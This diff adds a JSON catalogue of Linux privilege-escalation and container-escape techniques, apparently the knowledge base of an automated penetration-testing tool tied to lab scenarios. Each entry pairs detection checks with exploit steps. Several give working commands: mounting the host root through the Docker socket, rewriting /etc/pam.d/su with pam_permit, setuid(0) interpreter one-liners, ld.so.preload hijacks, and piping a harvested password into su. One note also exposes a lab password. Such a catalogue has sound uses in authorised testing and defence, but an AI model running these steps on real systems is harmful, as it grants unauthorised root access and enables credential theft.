@@ -1,0 +1,988 @@
+{
+  "version": 3,
+  "sources": [
+    "GTFOBins (local binary techniques)",
+    "PEASS-ng linPEAS container and Linux enumeration categories",
+    "deepce Docker/LXC escape checks",
+    "LinEnum Linux enumeration checks",
+    "Offensive-Linux-Privilege-Escalation technique notes"
+  ],
+  "levels": {
+    "container_root": "uid/euid 0 inside the target container",
+    "host_rootfs_access": "read or write access to the host root filesystem",
+    "host_root_session": "command execution in a host namespace or host context"
+  },
+  "techniques": [
+    {
+      "id": "docker_group",
+      "name": "Docker group / socket container control",
+      "vector": "docker",
+      "signals": [
+        "docker_group_membership",
+        "runtime_socket_present",
+        "docker_api_accessible"
+      ],
+      "preconditions": [
+        "docker-named group matches the socket GID, or socket access is confirmed"
+      ],
+      "verify": "id; stat -Lc '%a %u %g %n' /var/run/docker.sock; docker version",
+      "exploit": "DOCKER_API_VERSION=<min> docker run --rm -v /:/host alpine chroot /host id",
+      "levels": [
+        "container_root",
+        "host_rootfs_access",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "docker API over Unix socket",
+        "read-only host mount inspection"
+      ],
+      "notes": "A socket inode or group name alone is not access; verify API negotiation."
+    },
+    {
+      "id": "privileged_container",
+      "name": "Privileged container / host device or namespace",
+      "vector": "container",
+      "signals": [
+        "effective_capabilities",
+        "host_filesystem_mount",
+        "shared_pid_namespace"
+      ],
+      "preconditions": [
+        "CAP_SYS_ADMIN effective for the target process or host devices visible"
+      ],
+      "verify": "grep CapEff /proc/self/status; ls -l /dev; cat /proc/self/mountinfo",
+      "exploit": "mount the host root or use nsenter only after confirming the primitive",
+      "levels": [
+        "container_root",
+        "host_rootfs_access",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "host mount",
+        "namespace entry",
+        "device access"
+      ],
+      "notes": "A --privileged label does not guarantee writable cgroups or SSH-session capabilities."
+    },
+    {
+      "id": "lxd_group",
+      "name": "LXD/LXC group container escape",
+      "vector": "lxd",
+      "signals": [
+        "dangerous_group_membership"
+      ],
+      "preconditions": [
+        "user is in lxd or lxc group and the LXD socket is reachable"
+      ],
+      "verify": "id; lxc list; lxc info",
+      "exploit": "create a privileged LXD container and mount /host or the host rootfs",
+      "levels": [
+        "container_root",
+        "host_rootfs_access",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "use an existing image",
+        "read-only host mount"
+      ],
+      "notes": "LXD access is control-plane access, not automatically a host shell."
+    },
+    {
+      "id": "nfs_root_squash",
+      "name": "NFS no_root_squash export",
+      "vector": "nfs",
+      "signals": [
+        "nfs_export"
+      ],
+      "preconditions": [
+        "an export permits root-owned file creation"
+      ],
+      "verify": "showmount -e host; mount -t nfs host:/export /mnt",
+      "exploit": "create a root-owned SUID helper or authorized_keys on the export",
+      "levels": [
+        "container_root",
+        "host_rootfs_access"
+      ],
+      "fallbacks": [
+        "use a different writable export"
+      ],
+      "notes": "Mount options and export policy determine whether the write is effective."
+    },
+    {
+      "id": "systemd_writable_unit",
+      "name": "Writable systemd unit or drop-in",
+      "vector": "service",
+      "signals": [
+        "writable_systemd_units",
+        "writable_service_paths"
+      ],
+      "preconditions": [
+        "a root-managed service loads a writable unit, drop-in, or exec path"
+      ],
+      "verify": "systemctl cat <unit>; ls -l <path>",
+      "exploit": "modify the unit or its executable, then reload/restart the service",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "systemd timer",
+        "writable environment file"
+      ],
+      "notes": "Reload/restart may be denied even when the file is writable."
+    },
+    {
+      "id": "cron_writable",
+      "name": "Writable cron script or wildcard injection",
+      "vector": "cron",
+      "signals": [
+        "cron_jobs",
+        "writable"
+      ],
+      "preconditions": [
+        "a root cron executes a writable file or an injectable wildcard"
+      ],
+      "verify": "cat /etc/crontab /etc/cron.d/*; ls -l <script>",
+      "exploit": "replace the script or create the wildcard payload and wait for execution",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "systemd timer",
+        "PATH hijack"
+      ],
+      "notes": "Do not assume cron is running in a container; verify the scheduler."
+    },
+    {
+      "id": "capability_setuid",
+      "name": "File capability CAP_SETUID",
+      "vector": "caps",
+      "signals": [
+        "file_capabilities"
+      ],
+      "preconditions": [
+        "a target executable has cap_setuid=ep"
+      ],
+      "verify": "/usr/sbin/getcap <path>; /usr/sbin/getcap -r /",
+      "exploit": "run the capability-bearing interpreter and call setuid(0)",
+      "levels": [
+        "container_root"
+      ],
+      "fallbacks": [
+        "file read through DAC_READ_SEARCH",
+        "SUID binary"
+      ],
+      "notes": "Check the target file's capability, not only the SSH shell's CapEff."
+    },
+    {
+      "id": "capability_read",
+      "name": "CAP_DAC_READ_SEARCH / CAP_DAC_OVERRIDE",
+      "vector": "caps",
+      "signals": [
+        "effective_capabilities",
+        "file_capabilities"
+      ],
+      "preconditions": [
+        "the target process has DAC_READ_SEARCH or DAC_OVERRIDE"
+      ],
+      "verify": "grep CapEff /proc/self/status; getcap <binary>",
+      "exploit": "read /etc/shadow or write a protected configuration file",
+      "levels": [
+        "container_root"
+      ],
+      "fallbacks": [
+        "SUID file-read",
+        "credential discovery"
+      ],
+      "notes": "Container init capabilities do not automatically reach an SSH login."
+    },
+    {
+      "id": "capability_sys_admin",
+      "name": "CAP_SYS_ADMIN mount/namespace",
+      "vector": "caps",
+      "signals": [
+        "effective_capabilities"
+      ],
+      "preconditions": [
+        "CAP_SYS_ADMIN effective for the acting process"
+      ],
+      "verify": "grep CapEff /proc/self/status; capsh --print",
+      "exploit": "mount a host filesystem or enter a host namespace after verification",
+      "levels": [
+        "container_root",
+        "host_rootfs_access",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "CAP_SYS_PTRACE",
+        "CAP_SYS_MODULE"
+      ],
+      "notes": "Verify mount and namespace permissions; the capability alone is a lead."
+    },
+    {
+      "id": "credential_reuse",
+      "name": "Credential mining and reuse",
+      "vector": "creds",
+      "signals": [
+        "credential_files"
+      ],
+      "preconditions": [
+        "a password, token, SSH key, or database credential is readable"
+      ],
+      "verify": "inspect history, env, config, .ssh, cloud and database files",
+      "exploit": "reuse the credential with su, ssh, database, or a service API",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "hash cracking",
+        "SSH key reuse"
+      ],
+      "notes": "Do not print secrets into the final evidence; record the path and successful use."
+    },
+    {
+      "id": "path_hijack",
+      "name": "Writable PATH / library / Python path",
+      "vector": "path",
+      "signals": [
+        "writable_path"
+      ],
+      "preconditions": [
+        "a root process resolves a command or module from a writable directory"
+      ],
+      "verify": "echo $PATH; ls -ld <dir>; find writable library directories",
+      "exploit": "place a payload earlier in PATH or in the imported module directory",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "LD_PRELOAD",
+        "sudo env_keep",
+        "relative service path"
+      ],
+      "notes": "A writable directory is not enough; verify the root process actually resolves there."
+    },
+    {
+      "id": "kernel_exposure",
+      "name": "Kernel version and protection exposure",
+      "vector": "kernel",
+      "signals": [
+        "kernel_exposure"
+      ],
+      "preconditions": [
+        "kernel version or protection flags match a known local exploit"
+      ],
+      "verify": "uname -r; sysctl kernel.unprivileged_userns_clone; check patches",
+      "exploit": "use a matching kernel PoC only after exact version verification",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "OverlayFS",
+        "Dirty Pipe",
+        "PwnKit"
+      ],
+      "notes": "Version proximity is not proof; run a harmless capability probe first."
+    },
+    {
+      "id": "ssh_agent_hijack",
+      "name": "SSH-agent socket hijacking",
+      "vector": "creds",
+      "signals": [
+        "socket_context",
+        "ssh_agent"
+      ],
+      "preconditions": [
+        "SSH_AUTH_SOCK points to a socket accessible to a root or privileged process"
+      ],
+      "verify": "echo $SSH_AUTH_SOCK; ls -l $SSH_AUTH_SOCK; ssh-add -l",
+      "exploit": "use the agent to authenticate to a reachable privileged account",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "SSH private key",
+        "credential reuse"
+      ],
+      "notes": "The agent may be visible but belong to another user; verify ownership."
+    },
+    {
+      "id": "sudo_env_keep",
+      "name": "Sudo env_keep / LD_PRELOAD / PYTHONPATH",
+      "vector": "sudo",
+      "signals": [
+        "sudo_nopasswd",
+        "env_keep",
+        "writable_path"
+      ],
+      "preconditions": [
+        "sudo preserves an attacker-controlled environment variable"
+      ],
+      "verify": "sudo -l; grep env_keep /etc/sudoers /etc/sudoers.d/*",
+      "exploit": "compile a shared object or module and invoke the allowed sudo command",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "sudo GTFOBins shell",
+        "writable sudoers"
+      ],
+      "notes": "Modern sudo may sanitize the variable; verify the exact rule."
+    },
+    {
+      "id": "sudo_version",
+      "name": "Sudo version-specific policy bypass",
+      "vector": "sudo",
+      "signals": [
+        "sudo_nopasswd",
+        "runtime_versions"
+      ],
+      "preconditions": [
+        "sudo version matches a verified local bypass"
+      ],
+      "verify": "sudo -V; exact version and patch level",
+      "exploit": "use the matching CVE only after version confirmation",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "sudo GTFOBins",
+        "writable sudoers"
+      ],
+      "notes": "Do not infer exploitability from a major version alone."
+    },
+    {
+      "id": "kernel_dirty_pipe",
+      "name": "Kernel local privilege escalation candidates",
+      "vector": "kernel",
+      "signals": [
+        "kernel_exposure"
+      ],
+      "preconditions": [
+        "exact kernel version and patch state are known"
+      ],
+      "verify": "uname -r; check distribution patch level",
+      "exploit": "use a matching local PoC with a harmless probe first",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "PwnKit",
+        "OverlayFS",
+        "Dirty Pipe"
+      ],
+      "notes": "Kernel exploits are version-sensitive and must not be guessed."
+    },
+    {
+      "id": "writable_sudoers",
+      "name": "Writable sudoers or sudoers.d",
+      "vector": "sudo",
+      "signals": [
+        "sudo_nopasswd",
+        "writable"
+      ],
+      "preconditions": [
+        "the current user can write a sudoers file"
+      ],
+      "verify": "ls -l /etc/sudoers /etc/sudoers.d; sudo -l",
+      "exploit": "add a NOPASSWD rule and invoke sudo",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "writable passwd/shadow",
+        "sudo GTFOBins"
+      ],
+      "notes": "Validate the file with visudo before relying on it."
+    },
+    {
+      "id": "docker_api_raw",
+      "name": "Docker API without CLI",
+      "vector": "docker",
+      "signals": [
+        "docker_api_accessible"
+      ],
+      "preconditions": [
+        "Unix socket accepts a Docker API request"
+      ],
+      "verify": "GET /version over the socket; confirm minimum API version",
+      "exploit": "create/start a container with a host bind and read the result through logs",
+      "levels": [
+        "container_root",
+        "host_rootfs_access",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "docker CLI with DOCKER_API_VERSION",
+        "curl --unix-socket"
+      ],
+      "notes": "Client version mismatch is not permission denied."
+    },
+    {
+      "id": "k8s_service_account",
+      "name": "Kubernetes service-account / API surface",
+      "vector": "container",
+      "signals": [
+        "container_boundary",
+        "socket_context"
+      ],
+      "preconditions": [
+        "a service-account token or reachable API server is present"
+      ],
+      "verify": "ls /var/run/secrets/kubernetes.io/serviceaccount; test API permissions",
+      "exploit": "use only the permissions actually granted by the API",
+      "levels": [
+        "container_root",
+        "host_rootfs_access",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "kubelet API",
+        "mounted secrets"
+      ],
+      "notes": "A token file alone does not prove cluster-admin rights."
+    },
+    {
+      "id": "ssh_key_reuse",
+      "name": "Readable SSH private key",
+      "vector": "creds",
+      "signals": [
+        "credential_files"
+      ],
+      "preconditions": [
+        "a readable private key belongs to a privileged account"
+      ],
+      "verify": "ls -l ~/.ssh /root/.ssh; ssh-keygen -y -f key",
+      "exploit": "use the key with ssh to the corresponding account",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "authorized_keys write",
+        "password reuse"
+      ],
+      "notes": "A key file may be public or encrypted; test authentication."
+    },
+    {
+      "id": "ssh_authorized_key_write",
+      "name": "Writable authorized_keys for a privileged account",
+      "vector": "creds",
+      "signals": [
+        "credential_files",
+        "writable"
+      ],
+      "preconditions": [
+        "the current user can write /root/.ssh/authorized_keys or a privileged user's file"
+      ],
+      "verify": "stat /root/.ssh/authorized_keys; test write access",
+      "exploit": "append the current user's public key and authenticate as that account",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "readable private key",
+        "passwd/sudoers write"
+      ],
+      "notes": "A readable root home is not writable by itself; verify the file mode."
+    },
+    {
+      "id": "db_client_config",
+      "name": "Database client config credential",
+      "vector": "creds",
+      "signals": [
+        "credential_files",
+        "plaintext_secret"
+      ],
+      "preconditions": [
+        "a readable .my.cnf/.pgpass or equivalent contains a password"
+      ],
+      "verify": "read the config; test the credential against the corresponding service",
+      "exploit": "use the DB credential or reuse it for su/ssh if the target reuses passwords",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "SQL command execution",
+        "credential reuse"
+      ],
+      "notes": "Database root is not automatically system root; test the target service."
+    },
+    {
+      "id": "polkit_rule",
+      "name": "Permissive polkit rule with pkexec",
+      "vector": "sudo",
+      "signals": [
+        "sudo_nopasswd",
+        "runtime_versions"
+      ],
+      "preconditions": [
+        "pkexec is SUID and a permissive polkit rule applies to the current user"
+      ],
+      "verify": "ls -l /usr/bin/pkexec; record whether rules.d is readable; run pkexec --disable-internal-agent id",
+      "exploit": "invoke pkexec with a non-interactive command",
+      "levels": [
+        "container_root"
+      ],
+      "fallbacks": [
+        "sudo NOPASSWD",
+        "SUID pkexec"
+      ],
+      "notes": "polkitd must be running. Rule visibility is not required for a policy check: an unreadable rules.d can still be permissive. A successful pkexec result is the proof."
+    },
+    {
+      "id": "dbus_policy",
+      "name": "Permissive DBus policy / privileged service method",
+      "vector": "sudo",
+      "signals": [
+        "socket_context",
+        "runtime_versions"
+      ],
+      "preconditions": [
+        "a privileged DBus service exposes an action callable by the low user"
+      ],
+      "verify": "busctl list; inspect policy; test one read-only method first",
+      "exploit": "invoke the privileged method with a non-destructive proof",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "polkit rule",
+        "SUID helper"
+      ],
+      "notes": "A visible system bus is not the same as a privileged policy."
+    },
+    {
+      "id": "writable_passwd",
+      "name": "Writable /etc/passwd",
+      "vector": "writable",
+      "signals": [
+        "writable"
+      ],
+      "preconditions": [
+        "the current user can write /etc/passwd"
+      ],
+      "verify": "ls -l /etc/passwd; test a reversible write",
+      "exploit": "append a passwordless uid-0 account and su to it",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "writable shadow",
+        "SUID file-write"
+      ],
+      "notes": "Back up the file and restore it after the proof."
+    },
+    {
+      "id": "writable_shadow",
+      "name": "Writable /etc/shadow",
+      "vector": "writable",
+      "signals": [
+        "writable"
+      ],
+      "preconditions": [
+        "the current user can write /etc/shadow"
+      ],
+      "verify": "ls -l /etc/shadow",
+      "exploit": "set a known root hash and authenticate with su",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "writable passwd",
+        "file-read shadow"
+      ],
+      "notes": "Verify the hash format and avoid locking out the account."
+    },
+    {
+      "id": "ld_library_path",
+      "name": "Library path / Python module search hijack",
+      "vector": "path",
+      "signals": [
+        "writable_path"
+      ],
+      "preconditions": [
+        "a privileged process imports from a writable path"
+      ],
+      "verify": "inspect service environment and Python import paths",
+      "exploit": "place a module or shared library in the resolved directory",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "LD_PRELOAD",
+        "PATH hijack"
+      ],
+      "notes": "The privileged process must actually import from that directory."
+    },
+    {
+      "id": "ld_preload",
+      "name": "LD_PRELOAD / shared-library hijack",
+      "vector": "path",
+      "signals": [
+        "writable_path"
+      ],
+      "preconditions": [
+        "a root process loads a library from a writable location"
+      ],
+      "verify": "ldd <binary>; inspect /etc/ld.so.preload and service environment",
+      "exploit": "compile a shared object that runs the payload on load",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "PYTHONPATH",
+        "PATH hijack"
+      ],
+      "notes": "Secure-execution and setuid processes may ignore the variable."
+    },
+    {
+      "id": "plaintext_config_secret",
+      "name": "Plaintext database/application config credential",
+      "vector": "creds",
+      "signals": [
+        "credential_files",
+        "plaintext_secret"
+      ],
+      "preconditions": [
+        "a readable config file contains a usable password, token, or key"
+      ],
+      "verify": "find readable .cnf/.ini/.env/.conf files; grep for password/token fields",
+      "exploit": "test the extracted credential with su, ssh, or the corresponding service",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "history reuse",
+        "SSH key",
+        "database service login"
+      ],
+      "notes": "A secret in a file is a lead until a target service accepts it; never print it in final evidence."
+    },
+    {
+      "id": "ssh_private_key_material",
+      "name": "Readable SSH private key",
+      "vector": "creds",
+      "signals": [
+        "ssh_private_key"
+      ],
+      "preconditions": [
+        "a readable private key exists and its public key is authorized for a privileged account"
+      ],
+      "verify": "ls -l ~/.ssh; ssh-keygen -y -f <key>; ssh -o BatchMode=yes -i <key> root@localhost id",
+      "exploit": "authenticate with the key to the account that authorized it",
+      "levels": [
+        "container_root",
+        "host_root_session"
+      ],
+      "fallbacks": [
+        "password from history",
+        "write authorized_keys"
+      ],
+      "notes": "A key file alone is not proof; the target must accept it and the result must show root."
+    },
+    {
+      "id": "sudo_tee_file_write",
+      "name": "Sudo tee arbitrary file write",
+      "vector": "sudo",
+      "signals": [
+        "sudo_nopasswd"
+      ],
+      "preconditions": [
+        "sudo grants tee with root privileges"
+      ],
+      "verify": "sudo -l; confirm tee path and that the target file is writable by root",
+      "exploit": "append a root-equivalent user to /etc/passwd or write a sudoers/authorized_keys entry",
+      "levels": [
+        "container_root"
+      ],
+      "fallbacks": [
+        "sudo cp",
+        "sudo dd",
+        "sudo install"
+      ],
+      "notes": "Prefer an idempotent non-destructive proof; verify the resulting account or key."
+    },
+    {
+      "id": "cron_installer_script",
+      "name": "Root cron executes a writable installer/post-install script",
+      "vector": "cron",
+      "signals": [
+        "cron_jobs",
+        "writable"
+      ],
+      "preconditions": [
+        "a root cron entry points to a script writable by the current user"
+      ],
+      "verify": "grep root cron entries; stat the referenced script",
+      "exploit": "replace the script and wait for one scheduler interval",
+      "levels": [
+        "container_root"
+      ],
+      "fallbacks": [
+        "systemd timer",
+        "wildcard injection"
+      ],
+      "notes": "The container must actually run cron; a missing cron daemon is not an exploit failure."
+    },
+    {
+      "id": "suid_file_read",
+      "name": "SUID interpreter/binary file-read branch",
+      "vector": "suid",
+      "signals": [
+        "suid"
+      ],
+      "preconditions": [
+        "the SUID program can read an arbitrary file as root"
+      ],
+      "verify": "run the program against /etc/shadow and confirm a root-only line is returned",
+      "exploit": "read shadow or a privileged config, then use a recovered credential",
+      "levels": [
+        "container_root"
+      ],
+      "fallbacks": [
+        "SUID file-write",
+        "SUID shell"
+      ],
+      "notes": "Many SUID binaries drop privileges for shell execution but still honor file-read functions; test both branches."
+    },
+    {
+      "id": "suid_file_write",
+      "name": "SUID program file-write branch",
+      "vector": "suid",
+      "signals": [
+        "suid"
+      ],
+      "preconditions": [
+        "the SUID program can write a chosen file as root"
+      ],
+      "verify": "write a harmless marker file and inspect its owner",
+      "exploit": "append a uid-0 passwd entry or replace a root-owned configuration",
+      "levels": [
+        "container_root"
+      ],
+      "fallbacks": [
+        "SUID file-read + su",
+        "writable passwd"
+      ],
+      "notes": "Do not assume a SUID interpreter can spawn a shell; file operations may be the reliable branch."
+    },
+    {
+      "id": "suid_child_euid",
+      "name": "SUID wrapper child inherits effective root",
+      "vector": "suid",
+      "signals": [
+        "suid"
+      ],
+      "preconditions": [
+        "the SUID wrapper launches a child without dropping effective UID"
+      ],
+      "verify": "run a harmless child that prints both uid and euid",
+      "exploit": "launch an allowed child command under the wrapper",
+      "levels": [
+        "container_root"
+      ],
+      "fallbacks": [
+        "SUID file-read",
+        "SUID file-write"
+      ],
+      "notes": "Observe euid explicitly; uid may remain low while euid is root."
+    },
+    {
+      "id": "sudo_program_plugin",
+      "name": "Sudo-allowed program plugin or script execution",
+      "vector": "sudo",
+      "signals": [
+        "sudo_nopasswd"
+      ],
+      "preconditions": [
+        "the sudo-allowed program loads a plugin, script, or test file controlled by the user"
+      ],
+      "verify": "read the program help/man page and test a harmless plugin path",
+      "exploit": "supply a shared library or script through the program's documented option",
+      "levels": [
+        "container_root"
+      ],
+      "fallbacks": [
+        "sudo GTFOBins shell",
+        "sudo env_keep"
+      ],
+      "notes": "The plugin must actually be loaded by the root process; option presence alone is not proof."
+    },
+    {
+      "id": "sudo_nm_plugin",
+      "name": "Sudo nm --plugin shared-object load",
+      "vector": "sudo",
+      "signals": [
+        "sudo_nopasswd"
+      ],
+      "preconditions": [
+        "sudo grants nm and the installed binutils supports --plugin"
+      ],
+      "verify": "sudo -n -l; nm --help | grep -- --plugin",
+      "exploit": "compile a shared object with a constructor and pass it via nm --plugin",
+      "levels": [
+        "container_root"
+      ],
+      "fallbacks": [
+        "sudo gdb",
+        "sudo python/perl",
+        "sudo objdump"
+      ],
+      "notes": "The plugin is loaded by the privileged process; a successful child uid proof is required."
+    },
+    {
+      "id": "root_file_write_sinks",
+      "name": "Root file-write primitive and its execution sinks",
+      "vector": "filewrite",
+      "signals": [
+        "suid_file_write",
+        "sudo_file_write",
+        "writable_root_file"
+      ],
+      "preconditions": [
+        "a SUID/sudo binary can write an arbitrary path as root"
+      ],
+      "verify": "printf x > /tmp/p; <primitive> if=/tmp/p of=/etc/pam.d/su.probe; ls -l /etc/pam.d/su.probe",
+      "exploit": "write /etc/pam.d/su with 'auth sufficient pam_permit.so', then su -c id root",
+      "levels": [
+        "container_root"
+      ],
+      "fallbacks": [
+        "/etc/ld.so.preload + any SUID-root binary",
+        "/etc/passwd with an empty-password uid-0 entry",
+        "/etc/sudoers.d/ fragment",
+        "/root/.ssh/authorized_keys"
+      ],
+      "notes": "A file-write primitive is a universal root sink selector. Prefer /etc/pam.d/su: one write makes su passwordless with no hash to compute and no new account. /etc/ld.so.preload needs one extra trigger step but survives even when PAM is not in use."
+    },
+    {
+      "id": "pam_stack_write",
+      "name": "Writable PAM stack turns su/sudo passwordless",
+      "vector": "filewrite",
+      "signals": [
+        "pam_config_writable",
+        "suid_file_write",
+        "sudo_file_write"
+      ],
+      "preconditions": [
+        "/etc/pam.d/su or common-auth is writable by the primitive"
+      ],
+      "verify": "ls -l /etc/pam.d/su /etc/pam.d/common-auth",
+      "exploit": "printf 'auth sufficient pam_permit.so\naccount sufficient pam_permit.so\n' > /etc/pam.d/su; su -c id root",
+      "levels": [
+        "container_root"
+      ],
+      "fallbacks": [
+        "/etc/pam.d/common-auth affects every service"
+      ],
+      "notes": "Verified in T1548_001_suid_dd: two commands from lowpriv to uid=0. pam_permit must be present in the image; check with ls /lib/*/security/pam_permit.so."
+    },
+    {
+      "id": "ld_so_preload_write",
+      "name": "Writable /etc/ld.so.preload plus a SUID trigger",
+      "vector": "filewrite",
+      "signals": [
+        "ld_so_preload_writable",
+        "ld_so_preload_absent",
+        "suid_root_binary_present"
+      ],
+      "preconditions": [
+        "the primitive can create /etc/ld.so.preload",
+        "at least one dynamically linked SUID-root binary exists"
+      ],
+      "verify": "ls -l /etc/ld.so.preload; find / -xdev -perm -4000 -type f | head",
+      "exploit": "write the path of an attacker .so into /etc/ld.so.preload, then run any SUID-root binary; guard the payload constructor so it runs once and only under euid 0",
+      "levels": [
+        "container_root"
+      ],
+      "fallbacks": [
+        "/etc/ld.so.conf.d/*.conf when preload is blocked"
+      ],
+      "notes": "Verified in T1548_001_suid_dd: three commands. The payload MUST self-guard (static flag + geteuid check + environment marker), otherwise every exec re-enters the constructor and the container hangs. Clean up by deleting the preload file from the root shell the payload drops."
+    },
+    {
+      "id": "capability_setuid_interpreter",
+      "name": "CAP_SETUID on an interpreter",
+      "vector": "capabilities",
+      "signals": [
+        "file_capabilities",
+        "cap_setuid"
+      ],
+      "preconditions": [
+        "getcap reports cap_setuid=ep on an interpreter binary"
+      ],
+      "verify": "getcap -r / 2>/dev/null | grep cap_setuid; getcap $(command -v python3)",
+      "exploit": "/usr/bin/python3 -c 'import os;os.setuid(0);os.system(\"id\")'; perl -e 'use POSIX; POSIX::setuid(0); system(\"id\")'; php -r 'posix_setuid(0); system(\"id\");'",
+      "levels": [
+        "container_root"
+      ],
+      "fallbacks": [
+        "tclsh needs a compiled extension calling setuid()",
+        "gdb via python import os; os.setuid(0)"
+      ],
+      "notes": "Match the interpreter BEFORE choosing the flag: python -c, perl -e, php -r, ruby -e, node -e. CAP_SETUID alone does not grant setgid, so call setuid() only — os.setgid(0) raises and aborts the payload."
+    },
+    {
+      "id": "credential_reuse_root",
+      "name": "Application secret equals the root password",
+      "vector": "credentials",
+      "signals": [
+        "plaintext_secret",
+        "db_client_config",
+        "password_reuse"
+      ],
+      "preconditions": [
+        "a readable config carries a plaintext password"
+      ],
+      "verify": "grep -rhiE 'password|passwd' /etc/mysql /etc/postgresql /home/*/.my.cnf /home/*/.pgpass 2>/dev/null",
+      "exploit": "echo '<config-password>' | su -c id root",
+      "levels": [
+        "container_root"
+      ],
+      "fallbacks": [
+        "mysql -uroot -p<password> when a server is running"
+      ],
+      "notes": "Verified in expert_db_credential_reuse: the MariaDB config password Tr0ub4dor-DB-Secret is also the root password, so the DB credential path collapses into a one-command su. Always test a harvested secret against the local root account before assuming it is only a database credential."
+    },
+    {
+      "id": "writable_root_executor",
+      "name": "Writable script that a root scheduler runs",
+      "vector": "scheduled",
+      "signals": [
+        "cron_root_jobs",
+        "writable_cron_target",
+        "writable_service_target"
+      ],
+      "preconditions": [
+        "a root cron/unit line names a path the low user can write"
+      ],
+      "verify": "for p in $(grep -rhoE '/[A-Za-z0-9_./-]+' /etc/crontab /etc/cron.d/* 2>/dev/null | sort -u); do [ -w \"$p\" ] && echo \"WRITABLE $p\"; done",
+      "exploit": "overwrite that script with a root-owned SUID shell copy, wait for the schedule",
+      "levels": [
+        "container_root"
+      ],
+      "fallbacks": [
+        "writable /etc/cron.d directory accepts a new root entry"
+      ],
+      "notes": "Verified in legacy_cron_writable and edb_19794/edb_23126. Always link the writable path back to a root line that names it: a writable file that no root process executes is not a path."
+    }
+  ]
+}
